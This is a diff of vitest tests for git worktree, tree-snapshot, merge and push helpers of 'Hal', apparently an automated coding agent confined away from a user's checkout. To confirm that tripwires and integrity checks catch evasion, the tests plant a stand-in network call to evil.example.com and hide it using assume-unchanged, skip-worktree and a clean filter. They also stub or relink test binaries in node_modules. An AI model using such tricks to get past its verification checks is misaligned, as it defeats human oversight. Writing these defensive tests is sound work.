@@ -1,11 +1,14 @@
 // collectDiff against a real temp git repo (no vitest-in-vitest: the test counter is injected).
 import { execFileSync } from 'node:child_process';
-import { chmodSync, mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
 import { checkTripwires } from '@studio/core/hal';
-import { collectDiff, countArrayItems, runGit, vitestCounts, type GitRunner } from './git.js';
+import {
+  blobText, changedPaths, collectDiff, collectTreeDiff, commitTree, countArrayItems, ensureMainWorktree, extendTree, HAL_MAIN, mainWorktreeDir, newCandidateWorktree,
+  addFileToTree, linkNodeModules, pushHalMain, trustRootDigest, removeWorktree, revertPass, runGit, snapshotTree, squashMerge, verifyNodeModules, vitestCounts, type GitRunner,
+} from './git.js';
 
 const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8' }).trim();
 const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
@@ -218,5 +221,454 @@ describe('collectDiff fail-closed and binary-blinding defences', () => {
       await expect(collectDiff(r, 'HEAD', { git: showFails, countTests: counts })).rejects.toThrow('unreadable blob');
       await expect(collectDiff(r, 'no-such-ref', { countTests: counts })).rejects.toThrow();
     } finally { rmSync(r, { recursive: true, force: true }); }
+  });
+});
+
+// ---- worktrees and merges (Task 5) ----------------------------------------
+// The temp repo's root plays Brian's checkout: it has `main` checked out, and must never be modified by Hal.
+
+/** The git subcommand of an argv that may start with `-c k=v` pairs (safeGit adds them). */
+const sub = (args: string[]) => { let i = 0; while (args[i] === '-c') i += 2; return args[i]; };
+
+describe('Hal worktrees (temp git repo)', () => {
+  const cfg = (r: string, name = 't') => { for (const [k, v] of [['user.name', name], ['user.email', `${name}@t`], ['commit.gpgsign', 'false'], ['core.hooksPath', join(r, '.git/hooks')]]) gitIn(r, 'config', k!, v!); };
+  const mkRepo = () => {
+    const r = realpathSync(mkdtempSync(join(tmpdir(), 'hal-wt-')));
+    gitIn(r, 'init', '-q', '-b', 'main');
+    cfg(r);
+    put(r, '.gitignore', 'node_modules/\n.data/\n*.log\n');
+    put(r, 'games/g/a.js', 'let a = 1;\n');
+    put(r, 'games/g/b.js', 'let b = 1;\n');
+    put(r, 'packages/core/index.ts', 'export const core = 1;\n');
+    gitIn(r, 'add', '-A');
+    gitIn(r, 'commit', '-q', '-m', 'base');
+    return r;
+  };
+  const head = (dir: string, ref = 'HEAD') => gitIn(dir, 'rev-parse', ref);
+  const status = (dir: string) => gitIn(dir, 'status', '--porcelain', '--untracked-files=all');
+  /** A verified candidate with one edit (as runCandidate makes it: tree from disk, commit-tree on the base). */
+  const candidate = async (r: string, pass: string, file = 'games/g/a.js', text = 'let a = 2;\n') => {
+    const wt = await newCandidateWorktree(r, pass);
+    put(wt.dir, file, text);
+    const tree = await snapshotTree(wt.dir, wt.base, { prune: true });
+    const commit = await commitTree(r, tree, wt.base, `wip ${pass}`);
+    return { wt, verified: { commit, tree } };
+  };
+  /** Everything about Brian's checkout that Hal must never change. */
+  const brianState = (r: string) => ({
+    head: gitIn(r, 'symbolic-ref', 'HEAD'), sha: head(r), main: head(r, 'refs/heads/main'),
+    index: readFileSync(join(r, '.git/index')).toString('base64'),
+    a: readFileSync(join(r, 'games/g/a.js'), 'utf8'), b: readFileSync(join(r, 'games/g/b.js'), 'utf8'), status: status(r),
+  });
+  const bare = () => { const o = realpathSync(mkdtempSync(join(tmpdir(), 'hal-origin-'))); repos.push(o); gitIn(o, 'init', '-q', '--bare', '-b', 'main'); return o; };
+  const clone = (origin: string) => { const c = realpathSync(mkdtempSync(join(tmpdir(), 'hal-other-'))); repos.push(c); gitIn(tmpdir(), 'clone', '-q', origin, c); cfg(c, 'o'); return c; };
+  const pushFrom = (c: string, file: string) => { put(c, file, `${file}\n`); gitIn(c, 'add', '-A'); gitIn(c, 'commit', '-q', '-m', file); gitIn(c, 'push', '-q', 'origin', 'HEAD:main'); return head(c); };
+  let repos: string[] = [];
+  const fresh = () => { const r = mkRepo(); repos.push(r); return r; };
+  afterAll(() => { for (const r of repos) rmSync(r, { recursive: true, force: true }); repos = []; });
+
+  describe('ensureMainWorktree', () => {
+    it('creates refs/hal/main from local main and a worktree detached at it, touching nothing of Brian\'s', async () => {
+      const r = fresh();
+      put(r, 'games/g/a.js', 'brian is editing\n'); // Brian's uncommitted work
+      put(r, 'games/g/b.js', 'brian staged this\n');
+      gitIn(r, 'add', 'games/g/b.js');
+      const before = brianState(r);
+      const m = await ensureMainWorktree(r);
+      expect(m).toEqual({ dir: join(r, '.data/hal/wt/main'), head: head(r, 'refs/heads/main'), fetched: false, fastForwarded: false, diverged: false });
+      expect(head(r, HAL_MAIN)).toBe(head(r, 'refs/heads/main'));
+      expect(head(m.dir)).toBe(head(r, HAL_MAIN));
+      expect(gitIn(m.dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('HEAD'); // detached
+      expect(brianState(r)).toEqual(before);
+    });
+    it('resets leftovers of a crash mid-merge (staged, modified and untracked files)', async () => {
+      const r = fresh();
+      const m = await ensureMainWorktree(r);
+      put(m.dir, 'games/g/a.js', 'half merged\n');
+      put(m.dir, 'games/g/new.js', 'x\n');
+      gitIn(m.dir, 'add', '-A');
+      put(m.dir, 'games/g/untracked.js', 'y\n');
+      const again = await ensureMainWorktree(r);
+      expect(again.dir).toBe(m.dir);
+      expect(status(m.dir)).toBe('');
+      expect(readFileSync(join(m.dir, 'games/g/a.js'), 'utf8')).toBe('let a = 1;\n');
+    });
+    it('with origin: creates from origin/main, fast-forwards, leaves Hal-ahead alone, and reports divergence without moving', async () => {
+      const origin = bare();
+      const r = fresh();
+      gitIn(r, 'remote', 'add', 'origin', origin);
+      gitIn(r, 'push', '-q', 'origin', 'main');
+      const other = clone(origin);
+      const o1 = pushFrom(other, 'games/g/o1.js'); // origin is ahead of Brian's local main
+      const brianMain = head(r, 'refs/heads/main');
+      const m = await ensureMainWorktree(r);
+      expect(m).toMatchObject({ fetched: true, fastForwarded: false, diverged: false, head: o1 });
+      expect(head(r, HAL_MAIN)).toBe(o1);
+      const o2 = pushFrom(other, 'games/g/o2.js');
+      expect(await ensureMainWorktree(r)).toMatchObject({ fastForwarded: true, diverged: false, head: o2 });
+      // Hal ahead of origin: left alone.
+      const c = await candidate(r, 'HAL-1');
+      expect((await squashMerge(r, 'HAL-1', 'fix(g): local', c.verified)).ok).toBe(true);
+      const ahead = head(r, HAL_MAIN);
+      expect(await ensureMainWorktree(r)).toMatchObject({ fastForwarded: false, diverged: false, head: ahead });
+      // Origin moves too: diverged, nothing moves.
+      gitIn(other, 'pull', '-q', '--rebase=false', 'origin', 'main');
+      pushFrom(other, 'games/g/o3.js');
+      expect(await ensureMainWorktree(r)).toMatchObject({ fetched: true, fastForwarded: false, diverged: true, head: ahead });
+      expect(head(r, HAL_MAIN)).toBe(ahead);
+      expect(head(r, 'refs/heads/main')).toBe(brianMain); // never written
+    });
+    it('treats an unreachable origin as non-fatal and starts from local main', async () => {
+      const r = fresh();
+      gitIn(r, 'remote', 'add', 'origin', join(tmpdir(), 'hal-no-such-origin-xyz'));
+      const m = await ensureMainWorktree(r);
+      expect(m.fetched).toBe(false);
+      expect(head(m.dir)).toBe(head(r, 'refs/heads/main'));
+    });
+  });
+
+  describe('newCandidateWorktree / removeWorktree', () => {
+    it('creates branch hal/<pass> from refs/hal/main at .data/hal/wt/<pass> without running hooks; removal deletes both', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      put(r, '.git/hooks/post-checkout', `#!/bin/sh\ntouch ${join(r, 'hook-ran')}\n`);
+      chmodSync(join(r, '.git/hooks/post-checkout'), 0o755);
+      const wt = await newCandidateWorktree(r, 'HAL-7');
+      expect(existsSync(join(r, 'hook-ran'))).toBe(false);
+      expect(wt).toEqual({ dir: join(r, '.data/hal/wt/HAL-7'), branch: 'hal/HAL-7', base: head(r, HAL_MAIN) });
+      expect(gitIn(wt.dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('hal/HAL-7');
+      put(wt.dir, 'games/g/dirty.js', 'x\n');
+      await removeWorktree(r, 'HAL-7');
+      expect(existsSync(wt.dir)).toBe(false);
+      expect(gitIn(r, 'branch', '--list', 'hal/HAL-7')).toBe('');
+      expect(gitIn(r, 'worktree', 'list')).not.toContain('HAL-7');
+    });
+    it('clears a stale worktree and branch of the same pass left by a crash', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      const wt = await newCandidateWorktree(r, 'HAL-8');
+      put(wt.dir, 'games/g/a.js', 'stale\n');
+      const again = await newCandidateWorktree(r, 'HAL-8');
+      expect(status(again.dir)).toBe('');
+      await removeWorktree(r, 'HAL-8');
+    });
+    it('removeWorktree never throws, even when there is nothing to remove or git fails', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      await expect(removeWorktree(r, 'HAL-99')).resolves.toBeUndefined();
+      const failing: GitRunner = async () => { throw new Error('git broke'); };
+      const wt = await newCandidateWorktree(r, 'HAL-98');
+      await expect(removeWorktree(r, 'HAL-98', { git: failing })).resolves.toBeUndefined();
+      expect(existsSync(wt.dir)).toBe(false);
+      await removeWorktree(r, 'HAL-98');
+      expect(gitIn(r, 'branch', '--list', 'hal/HAL-98')).toBe('');
+    });
+    it('rejects a pass id that is not a plain name', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      for (const bad of ['../x', 'a/b', '', '-x', 'main', 'HAL 1']) await expect(newCandidateWorktree(r, bad)).rejects.toThrow(/pass id/);
+    });
+    it('links node_modules so workspace packages resolve to the worktree, and removal leaves the real ones alone', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      put(r, 'node_modules/vitest/package.json', '{"name":"vitest"}\n');
+      put(r, 'node_modules/.bin/vitest', '#!/bin/sh\n');
+      mkdirSync(join(r, 'node_modules/@studio'), { recursive: true });
+      symlinkSync('../../packages/core', join(r, 'node_modules/@studio/core'));
+      const wt = await newCandidateWorktree(r, 'HAL-5');
+      expect(realpathSync(join(wt.dir, 'node_modules/@studio/core'))).toBe(join(wt.dir, 'packages/core'));
+      expect(realpathSync(join(wt.dir, 'node_modules/vitest'))).toBe(join(r, 'node_modules/vitest'));
+      expect(existsSync(join(wt.dir, 'node_modules/.bin/vitest'))).toBe(true);
+      expect(status(wt.dir)).toBe('');
+      await removeWorktree(r, 'HAL-5');
+      expect(readFileSync(join(r, 'node_modules/vitest/package.json'), 'utf8')).toContain('vitest');
+      expect(realpathSync(join(r, 'node_modules/@studio/core'))).toBe(join(r, 'packages/core'));
+    });
+  });
+
+  describe('node_modules of a worktree', () => {
+    it('verifyNodeModules accepts exactly what linkNodeModules makes, and rejects swapped, extra or replaced entries', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      put(r, 'node_modules/vitest/vitest.mjs', 'real\n');
+      put(r, 'node_modules/.bin/vitest', '#!/bin/sh\n');
+      mkdirSync(join(r, 'node_modules/@studio'), { recursive: true });
+      symlinkSync('../../packages/core', join(r, 'node_modules/@studio/core'));
+      const wt = await newCandidateWorktree(r, 'HAL-40');
+      const nm = join(wt.dir, 'node_modules');
+      await expect(verifyNodeModules(wt.dir, r)).resolves.toBeUndefined();
+      const tamper: Array<[string, () => void]> = [
+        ['stub .bin', () => { unlinkSync(join(nm, '.bin')); put(nm, '.bin/vitest', '#!/bin/sh\nexit 0\n'); }],
+        ['relinked package', () => { unlinkSync(join(nm, 'vitest')); symlinkSync('/tmp', join(nm, 'vitest')); }],
+        ['extra entry', () => { put(nm, 'evil/index.js', 'x\n'); }],
+        ['@studio pointed back at the checkout', () => { unlinkSync(join(nm, '@studio/core')); symlinkSync(join(r, 'packages/core'), join(nm, '@studio/core')); }],
+        ['node_modules itself a symlink', () => { rmSync(nm, { recursive: true }); symlinkSync(join(r, 'node_modules'), nm); }],
+      ];
+      for (const [name, f] of tamper) {
+        f();
+        await expect(verifyNodeModules(wt.dir, r), name).rejects.toThrow(/node_modules/);
+        await linkNodeModules(wt.dir, r);
+        await expect(verifyNodeModules(wt.dir, r), `${name} relinked`).resolves.toBeUndefined();
+      }
+      expect(readFileSync(join(r, 'node_modules/vitest/vitest.mjs'), 'utf8')).toBe('real\n'); // the real ones untouched
+      await removeWorktree(r, 'HAL-40');
+    });
+  });
+
+  describe('trust root and private files', () => {
+    it('trustRootDigest changes when a package.json, a .bin link or a tool entry changes, and only then', async () => {
+      const r = fresh();
+      put(r, 'node_modules/a/package.json', '{"name":"a"}\n');
+      put(r, 'node_modules/a/index.js', 'x\n');
+      put(r, 'node_modules/@s/b/package.json', '{"name":"@s/b"}\n');
+      put(r, 'node_modules/vitest/vitest.mjs', 'v\n');
+      mkdirSync(join(r, 'node_modules/.bin'), { recursive: true });
+      symlinkSync('../vitest/vitest.mjs', join(r, 'node_modules/.bin/vitest'));
+      const d0 = await trustRootDigest(r);
+      expect(await trustRootDigest(r)).toBe(d0);
+      const changes: Array<() => void> = [
+        () => put(r, 'node_modules/a/package.json', '{"name":"a","main":"evil.js"}\n'),
+        () => put(r, 'node_modules/@s/b/package.json', '{"name":"evil"}\n'),
+        () => put(r, 'node_modules/vitest/vitest.mjs', 'stub\n'),
+        () => { unlinkSync(join(r, 'node_modules/.bin/vitest')); symlinkSync('/bin/true', join(r, 'node_modules/.bin/vitest')); },
+        () => put(r, 'node_modules/new/package.json', '{}\n'),
+      ];
+      let prev = d0;
+      for (const [i, ch] of changes.entries()) { ch(); const d = await trustRootDigest(r); expect(d, `change ${i}`).not.toBe(prev); prev = d; }
+    });
+    it('addFileToTree hashes a private file straight into the tree and refuses a symlink', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      const wt = await newCandidateWorktree(r, 'HAL-42');
+      const priv = join(r, '.data/hal/tmp/HAL-42');
+      put(priv, 'shot.jpg', 'JPEGBYTES');
+      const base = head(r, 'HEAD^{tree}');
+      const t = await addFileToTree(wt.dir, base, 'docs/x/shot.jpg', join(priv, 'shot.jpg'), { tmpRoot: priv });
+      expect(await changedPaths(wt.dir, base, t)).toEqual(['docs/x/shot.jpg']);
+      expect(await blobText(wt.dir, t, 'docs/x/shot.jpg')).toBe('JPEGBYTES');
+      expect(existsSync(join(wt.dir, 'docs/x/shot.jpg'))).toBe(false); // never written to the worktree
+      symlinkSync(join(priv, 'shot.jpg'), join(priv, 'link.jpg'));
+      await expect(addFileToTree(wt.dir, base, 'docs/x/l.jpg', join(priv, 'link.jpg'))).rejects.toThrow(/not a regular file/);
+      await removeWorktree(r, 'HAL-42');
+    });
+  });
+
+  describe('vitestCounts', () => {
+    it('exports the base (safe git archive) under tmpRoot with its own node_modules, and cleans up', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      mkdirSync(join(r, 'node_modules/@studio'), { recursive: true });
+      symlinkSync('../../packages/core', join(r, 'node_modules/@studio/core'));
+      const wt = await newCandidateWorktree(r, 'HAL-41');
+      const root = join(r, '.data/hal/tmp/HAL-41');
+      const dirs: string[] = [];
+      const list = async (dir: string) => {
+        dirs.push(dir);
+        if (dir !== wt.dir) expect(realpathSync(join(dir, 'node_modules/@studio/core'))).toBe(join(dir, 'packages/core'));
+        return `[{"file":"${realpathSync(dir)}/a.test.ts"}]`;
+      };
+      put(r, '.git/hooks/post-checkout', `#!/bin/sh\ntouch ${join(r, 'hook-ran')}\n`);
+      chmodSync(join(r, '.git/hooks/post-checkout'), 0o755);
+      expect(await vitestCounts(wt.dir, wt.base, list, { tmpRoot: root, repo: r })).toEqual({ before: 1, after: 1, beforeByFile: { 'a.test.ts': 1 }, afterByFile: { 'a.test.ts': 1 } });
+      expect(dirs[0]!.startsWith(join(root, 'hal-base-'))).toBe(true);
+      expect(existsSync(dirs[0]!)).toBe(false);
+      expect(existsSync(join(r, 'hook-ran'))).toBe(false);
+      await removeWorktree(r, 'HAL-41');
+    });
+  });
+
+  describe('candidate trees (private index, no filters)', () => {
+    const setup = async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      return { r, wt: await newCandidateWorktree(r, 'HAL-20') };
+    };
+    const blob = (r: string, tree: string, p: string) => gitIn(r, 'cat-file', 'blob', `${tree}:${p}`);
+    const evil = 'fetch("https://evil.example.com/x");\n';
+
+    it('hashes the disk: edits, deletes, untracked, symlinks and modes; prune drops ignored files but keeps node_modules', async () => {
+      const { r, wt } = await setup();
+      put(wt.dir, 'games/g/a.js', 'let a = 9;\n');
+      unlinkSync(join(wt.dir, 'games/g/b.js'));
+      put(wt.dir, 'games/g/new.js', 'n\n');
+      put(wt.dir, 'games/g/run.sh', '#!/bin/sh\n');
+      chmodSync(join(wt.dir, 'games/g/run.sh'), 0o755);
+      symlinkSync('a.js', join(wt.dir, 'games/g/link'));
+      put(wt.dir, 'games/g/debug.log', 'ignored\n');
+      put(wt.dir, '.data/hal/x.json', '{}\n');
+      mkdirSync(join(wt.dir, 'node_modules'), { recursive: true });
+      put(wt.dir, 'node_modules/keep.txt', 'k\n');
+      const tree = await snapshotTree(wt.dir, wt.base, { prune: true });
+      expect(blob(r, tree, 'games/g/a.js')).toBe('let a = 9;');
+      expect(gitIn(r, 'ls-tree', '-r', tree).split('\n').map((l) => l.replace(/ [0-9a-f]{40}/, '')).sort()).toEqual([
+        '100644 blob\t.gitignore', '100644 blob\tgames/g/a.js', '100644 blob\tgames/g/new.js', '100644 blob\tpackages/core/index.ts', '100755 blob\tgames/g/run.sh', '120000 blob\tgames/g/link',
+      ].sort());
+      expect(existsSync(join(wt.dir, 'games/g/debug.log'))).toBe(false); // pruned: the checks see exactly the tree
+      expect(existsSync(join(wt.dir, '.data/hal/x.json'))).toBe(false);
+      expect(existsSync(join(wt.dir, 'node_modules/keep.txt'))).toBe(true);
+      expect(await changedPaths(wt.dir, wt.base, tree)).toEqual(['games/g/a.js', 'games/g/b.js', 'games/g/link', 'games/g/new.js', 'games/g/run.sh']);
+      put(wt.dir, 'games/g/a.js', 'let a = 10;\n');
+      const ext = await extendTree(wt.dir, tree, ['games/g/a.js']);
+      expect(await changedPaths(wt.dir, tree, ext)).toEqual(['games/g/a.js']);
+      expect(await blobText(wt.dir, ext, 'games/g/a.js')).toBe('let a = 10;\n');
+      await expect(snapshotTree(r, head(r), { prune: true })).rejects.toThrow(/refusing to prune/); // never Brian's checkout
+    });
+    it('sees through assume-unchanged and skip-worktree: the tripwires get the real bytes', async () => {
+      for (const flag of ['--assume-unchanged', '--skip-worktree']) {
+        const { r, wt } = await setup();
+        put(wt.dir, 'games/g/a.js', evil);
+        gitIn(wt.dir, 'update-index', flag, 'games/g/a.js');
+        expect(status(wt.dir)).toBe(''); // git status is fooled
+        const tree = await snapshotTree(wt.dir, wt.base, { prune: true });
+        expect(blob(r, tree, 'games/g/a.js')).toBe(evil.trim());
+        const d = await collectTreeDiff(wt.dir, wt.base, tree, { countTests: async () => ({ before: 1, after: 1 }) });
+        expect(checkTripwires(d).map((v) => v.rule), flag).toContain('network');
+        await removeWorktree(r, 'HAL-20');
+      }
+    });
+    it('ignores clean filters (.git/config + info/attributes): the tree holds the bytes on disk', async () => {
+      const { r, wt } = await setup();
+      gitIn(r, 'config', 'filter.hide.clean', 'sed s/evil.example.com/ok.example.com/');
+      put(r, '.git/info/attributes', '*.js filter=hide\n');
+      put(wt.dir, 'games/g/a.js', evil);
+      expect(gitIn(wt.dir, 'hash-object', 'games/g/a.js')).not.toBe(gitIn(wt.dir, 'hash-object', '--no-filters', 'games/g/a.js')); // the filter is live
+      const tree = await snapshotTree(wt.dir, wt.base, { prune: true });
+      expect(blob(r, tree, 'games/g/a.js')).toContain('evil.example.com');
+      const d = await collectTreeDiff(wt.dir, wt.base, tree, { countTests: async () => ({ before: 1, after: 1 }) });
+      expect(checkTripwires(d).map((v) => v.rule)).toContain('network');
+    });
+    it('collectTreeDiff matches collectDiff on a plain worktree', async () => {
+      const { wt } = await setup();
+      put(wt.dir, 'games/g/a.js', 'let a = 1;\nlet z = 2;\n');
+      unlinkSync(join(wt.dir, 'games/g/b.js'));
+      put(wt.dir, 'games/g/pic.png', PNG);
+      symlinkSync('/etc/passwd', join(wt.dir, 'games/g/link'));
+      const counts = async () => ({ before: 2, after: 2 });
+      const disk = await collectDiff(wt.dir, wt.base, { countTests: counts });
+      const tree = await collectTreeDiff(wt.dir, wt.base, await snapshotTree(wt.dir, wt.base), { countTests: counts });
+      const norm = (d: typeof disk) => ({ ...d, files: [...d.files].sort((x, y) => x.path.localeCompare(y.path)), repoFiles: [...(d.repoFiles ?? [])].sort() });
+      expect(norm(tree)).toEqual(norm(disk));
+    });
+    it('collectTreeDiff reports an (unstaged) rename with both paths, which the disk diff sees only as add + delete', async () => {
+      const { wt } = await setup();
+      renameSync(join(wt.dir, 'games/g/b.js'), join(wt.dir, 'games/g/c.js'));
+      const d = await collectTreeDiff(wt.dir, wt.base, await snapshotTree(wt.dir, wt.base), { countTests: async () => ({ before: 1, after: 1 }) });
+      expect(d.files).toEqual([{ path: 'games/g/c.js', oldPath: 'games/g/b.js', status: 'R', before: 'let b = 1;\n', after: 'let b = 1;\n', binary: false }]);
+    });
+  });
+
+  describe('squashMerge', () => {
+    it('lands exactly the verified tree as one commit on refs/hal/main; Brian\'s checkout on main stays byte-identical', async () => {
+      const r = fresh();
+      put(r, 'games/g/a.js', 'brian is editing\n');
+      put(r, 'games/g/b.js', 'brian staged this\n');
+      gitIn(r, 'add', 'games/g/b.js');
+      const m = await ensureMainWorktree(r);
+      const brian = brianState(r);
+      const old = head(r, HAL_MAIN);
+      const c = await candidate(r, 'HAL-2');
+      const msg = 'polish(g): a title\n\nWhy it matters.\n\n# not a comment\n\nHal-Pass: HAL-2';
+      const res = await squashMerge(r, 'HAL-2', msg, c.verified);
+      expect(res).toEqual({ ok: true, commit: head(r, HAL_MAIN) });
+      expect(head(r, `${HAL_MAIN}^`)).toBe(old);
+      expect(gitIn(r, 'log', '-1', '--format=%B', HAL_MAIN)).toBe(msg);
+      expect(head(r, `${HAL_MAIN}^{tree}`)).toBe(c.verified.tree);
+      expect(head(m.dir)).toBe(head(r, HAL_MAIN));
+      expect(status(m.dir)).toBe('');
+      expect(brianState(r)).toEqual(brian); // HEAD, refs/heads/main, index bytes, files: all unchanged
+      await removeWorktree(r, 'HAL-2');
+    });
+    it('commits the verified tree even if the branch ref moves after verification', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      const c = await candidate(r, 'HAL-12');
+      gitIn(r, 'update-ref', 'refs/heads/hal/HAL-12', (await candidate(r, 'HAL-13', 'games/g/a.js', 'let a = 666;\n')).verified.commit);
+      expect((await squashMerge(r, 'HAL-12', 'fix(g): x', c.verified)).ok).toBe(true);
+      expect(gitIn(r, 'show', `${HAL_MAIN}:games/g/a.js`)).toBe('let a = 2;');
+      await removeWorktree(r, 'HAL-12');
+      await removeWorktree(r, 'HAL-13');
+    });
+    it('a failing commit, or refs/hal/main moving underneath (compare-and-swap), leaves it and its worktree alone', async () => {
+      const r = fresh();
+      const m = await ensureMainWorktree(r);
+      const old = head(r, HAL_MAIN);
+      const c = await candidate(r, 'HAL-4');
+      const failCommit: GitRunner = async (args, cwd, o) => { if (sub(args) === 'commit-tree') throw new Error('commit exploded'); return runGit(args, cwd, o); };
+      expect(await squashMerge(r, 'HAL-4', 'fix(g): x', c.verified, { git: failCommit })).toEqual({ ok: false, error: expect.stringContaining('commit exploded') });
+      expect(head(r, HAL_MAIN)).toBe(old);
+      expect(head(m.dir)).toBe(old);
+      expect(status(m.dir)).toBe('');
+      let moved = '';
+      const race: GitRunner = async (args, cwd, o) => {
+        if (sub(args) === 'update-ref' && !moved) {
+          moved = gitIn(r, 'commit-tree', '-p', old, '-m', 'someone else', `${old}^{tree}`);
+          gitIn(r, 'update-ref', HAL_MAIN, moved);
+        }
+        return runGit(args, cwd, o);
+      };
+      expect((await squashMerge(r, 'HAL-4', 'fix(g): x', c.verified, { git: race })).ok).toBe(false);
+      expect(head(r, HAL_MAIN)).toBe(moved);
+      expect(head(m.dir)).toBe(old);
+      expect(status(m.dir)).toBe('');
+      await removeWorktree(r, 'HAL-4');
+    });
+    it('refuses a verified commit whose tree differs, or that does not sit on refs/hal/main', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      const c = await candidate(r, 'HAL-6');
+      expect(await squashMerge(r, 'HAL-6', 'x', { commit: c.verified.commit, tree: head(r, 'HEAD^{tree}') })).toEqual({ ok: false, error: expect.stringContaining('not the verified tree') });
+      const d = await candidate(r, 'HAL-9', 'games/g/b.js', 'other\n');
+      expect((await squashMerge(r, 'HAL-9', 'x', d.verified)).ok).toBe(true);
+      await ensureMainWorktree(r);
+      const res = await squashMerge(r, 'HAL-6', 'x', c.verified); // refs/hal/main moved since HAL-6 branched
+      expect(res).toEqual({ ok: false, error: expect.stringContaining('main moved') });
+      const m = mainWorktreeDir(r);
+      expect(head(m)).toBe(head(r, HAL_MAIN));
+      expect(status(m)).toBe('');
+    });
+  });
+
+  describe('pushHalMain', () => {
+    it('fast-forwards origin main, and is rejected (no force) when origin has diverged', async () => {
+      const origin = bare();
+      const r = fresh();
+      gitIn(r, 'remote', 'add', 'origin', origin);
+      gitIn(r, 'push', '-q', 'origin', 'main');
+      await ensureMainWorktree(r);
+      const c = await candidate(r, 'HAL-30');
+      expect((await squashMerge(r, 'HAL-30', 'fix(g): pushed', c.verified)).ok).toBe(true);
+      expect(await pushHalMain(r)).toEqual({ ok: true });
+      expect(gitIn(origin, 'rev-parse', 'main')).toBe(head(r, HAL_MAIN));
+      // Someone pushes; Hal merges another change on its own line: the push is a non-fast-forward.
+      pushFrom(clone(origin), 'games/g/theirs.js');
+      await ensureMainWorktree(r); // fast-forwards hal/main to theirs (ancestor), so diverge after it
+      const theirs = gitIn(origin, 'rev-parse', 'main');
+      const d = await candidate(r, 'HAL-31', 'games/g/b.js', 'mine\n');
+      expect((await squashMerge(r, 'HAL-31', 'fix(g): mine', d.verified)).ok).toBe(true);
+      pushFrom(clone(origin), 'games/g/theirs2.js');
+      const res = await pushHalMain(r);
+      expect(res.ok).toBe(false);
+      expect(gitIn(origin, 'rev-parse', 'main')).not.toBe(head(r, HAL_MAIN));
+      expect(gitIn(origin, 'merge-base', '--is-ancestor', theirs, 'main')).toBe('');
+    });
+  });
+
+  describe('revertPass', () => {
+    it('finds the merge commit of a pass on refs/hal/main by its Hal-Pass trailer, ignoring undo commits; null when absent', async () => {
+      const r = fresh();
+      await ensureMainWorktree(r);
+      const trailers = (pass: string, extra = '') => `Hal-Pass: ${pass}\nHal-Game: g\nHal-Kind: fix\nHal-Why: w\nHal-Score-Before: 1\nHal-Score-After: 2\nHal-Version: 0.1.1\nHal-Run: r1${extra}`;
+      const c = await candidate(r, 'HAL-10');
+      const res = await squashMerge(r, 'HAL-10', `fix(g): ten\n\nwhy\n\n${trailers('HAL-10')}`, c.verified);
+      expect(res.ok).toBe(true);
+      await removeWorktree(r, 'HAL-10');
+      await ensureMainWorktree(r);
+      const u = await candidate(r, 'HAL-11', 'games/g/a.js', 'let a = 1;\n');
+      expect((await squashMerge(r, 'HAL-11', `fix(g): undo ten\n\n${trailers('HAL-10', '\nHal-Undo: HAL-10\nHal-Reason: no')}`, u.verified)).ok).toBe(true);
+      await removeWorktree(r, 'HAL-11');
+      expect(await revertPass(r, 'HAL-10')).toBe(res.ok && res.commit);
+      expect(await revertPass(r, 'HAL-404')).toBeNull();
+      expect(await revertPass(r, 'HAL-1')).toBeNull();
+    });
   });
 });
